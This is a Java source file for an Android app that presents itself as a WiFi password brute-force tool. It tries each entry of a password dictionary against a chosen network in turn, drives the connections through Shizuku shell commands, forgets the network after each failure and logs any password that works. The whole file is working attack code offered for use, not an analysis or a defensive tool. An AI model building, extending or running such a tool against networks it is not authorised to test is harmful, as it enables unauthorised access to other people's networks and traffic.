package wifi.pojie;

import android.text.Editable;
import android.util.Log;

import androidx.annotation.NonNull;

import java.util.ArrayList;
import java.util.Objects;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class WifiPojie {
    private static final String TAG = "WifiPojie";

    private final Editable ssid;
    private final String[] dictionary;
    private final int timeoutMillis;
    private final Consumer<String> logOutputFunction;
    private final TriConsumer<Integer, Integer, String> progressFunction;
    private final Runnable endFunc;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private ConnectWifi connectWifi;
    private boolean isDestroyed = false;
    private int currentTryIndex = 0;

    /**
     * 构造函数
     *
     * @param ssid WiFi的SSID
     * @param dictionary 用作字典的字符串数组
     * @param startLine 字典的起始行（从1开始计数）
     * @param timeoutMillis 单个超时时间（毫秒）
     * @param logOutputFunction 输出日志函数
     * @param progressFunction 设置进度函数(当前进度数字,总进度数字,进度信息文本)
     * @param endFunc 任务结束时执行的函数
     */
    public WifiPojie(Editable ssid,
                     @NonNull String[] dictionary,
                     int startLine,
                     int timeoutMillis,
                     Consumer<String> logOutputFunction,
                     TriConsumer<Integer, Integer, String> progressFunction,
                     Runnable endFunc) throws ExecutionException, InterruptedException /* throws ExecutionException, InterruptedException */ {
        this.ssid = ssid;
        this.dictionary = dictionary;
        this.timeoutMillis = timeoutMillis;
        this.logOutputFunction = logOutputFunction;
        this.progressFunction = progressFunction;
        this.endFunc = endFunc;
        this.currentTryIndex = startLine - 1; // 转换为基于0的索引

        // 在后台线程启动破解过程
        logOutputFunction.accept("      _      __                 _        \n" +
                "     | |___ / _|_ __ ___  _   _| |_ __ _ \n" +
                "  _  | / __| |_| '_ ` _ \\| | | | __/ _` |\n" +
                " | |_| \\__ \\  _| | | | | | |_| | || (_| |\n" +
                "  \\___/|___/_| |_| |_| |_|\\__, |\\__\\__, |\n" +
                "                          |___/    |___/ \n" +
                "==========================================");
        logOutputFunction.accept("wifi密码暴力破解工具v1 for Android");
        if(getWifiId(String.valueOf(ssid))!=-1){
            logOutputFunction.accept("当前wifi已经保存，为避免误操作请去设置忘记此wifi");
            destroy();
            return;
        }
        if(ShizukuHelper.executeCommandSync("cmd wifi status").startsWith("Wifi is disabled")){
            logOutputFunction.accept("wifi已关闭，正在打开wifi...");
            ShizukuHelper.executeCommandSync("cmd wifi set-wifi-enabled enabled");
        }
        logOutputFunction.accept("开始运行 SSID:" + ssid + " 密码总数:" + dictionary.length + " 超时时间:" + timeoutMillis+"ms\n");
        executorService.submit(this::startCrackingProcess);
    }

    private void startCrackingProcess() {
        // 检查是否已被销毁
        if (isDestroyed || currentTryIndex >= dictionary.length) {
            if (currentTryIndex >= dictionary.length) {
                logOutputFunction.accept("所有密码尝试完毕，连接失败！");
            }
            destroy();
            return;
        }

        try {
            // 更新进度
            if (progressFunction != null) {
                progressFunction.accept(
                        currentTryIndex + 1,
                        dictionary.length,
                        (currentTryIndex*100/dictionary.length) +"% ["+currentTryIndex+"/"+dictionary.length+"] 正在尝试："+dictionary[currentTryIndex]
                );
            }

            // 创建新的ConnectWifi实例
            connectWifi = new ConnectWifi(timeoutMillis);

            // 尝试连接
            connectWifi.connect(String.valueOf(ssid), dictionary[currentTryIndex], (resultCode) -> {
                // 确保回调在非销毁状态下执行
                if (isDestroyed) {
                    return;
                }
                logOutputFunction.accept(
                        "密码:" + dictionary[currentTryIndex]+
                        " 结果:" + (new String[]{"success", "密码错误", "timeout", "unknown"})[resultCode]
                );
                if(resultCode!=0) forgetWifi(String.valueOf(ssid));

                if (resultCode == 0) {
                    // 成功连接
                    logOutputFunction.accept("成功连接到WiFi网络: " + ssid + " 密码: " + dictionary[currentTryIndex]);
                    destroy();
                } else {
                    // 尝试下一个密码
                    currentTryIndex++;
                    
                    // 清理当前连接器
                    if (connectWifi != null) {
                        connectWifi.destroy();
                    }

                    // 提交下一个尝试任务
                    executorService.submit(this::startCrackingProcess);
                }
            });
        } catch (Exception e) {
            logOutputFunction.accept("尝试连接时发生错误: " + e.getMessage());
            destroy();
        }
    }

    public void destroy() {
        if (isDestroyed) return;

        isDestroyed = true;

        if (connectWifi != null) {
            connectWifi.destroy();
        }

        executorService.shutdownNow();

        if (logOutputFunction != null) {
            logOutputFunction.accept("==运行结束==");
        }

        if (endFunc != null) {
            endFunc.run();
        }
    }
    private int getWifiId(String ssid) {
        try {
            String result=ShizukuHelper.executeCommandSync("cmd wifi list-networks");
            String[] lines = result.split("\n");

            for (int i = 1; i < lines.length; i++) {
                    String name = lines[i].substring(13, 46).split(" ")[0];
                    int id = Integer.parseInt(lines[i].substring(0, 13).split(" ")[0]);
                    if (Objects.equals(name, ssid)){
                        return id;
                    }
            }
        }catch (RuntimeException ignored) {} catch (ExecutionException | InterruptedException e) {
            throw new RuntimeException(e);
        }
        return -1;
    }
    private void forgetWifi(String ssid) {
        int id=getWifiId(ssid);
        if(id!=-1) {
            try {
                ShizukuHelper.executeCommandSync("cmd wifi forget-network "+id);
                Log.d(TAG,"忘记密码："+ssid);
            } catch (ExecutionException | InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }
    @FunctionalInterface
    public interface TriConsumer<T, U, V> {
        void accept(T t, U u, V v);
    }
}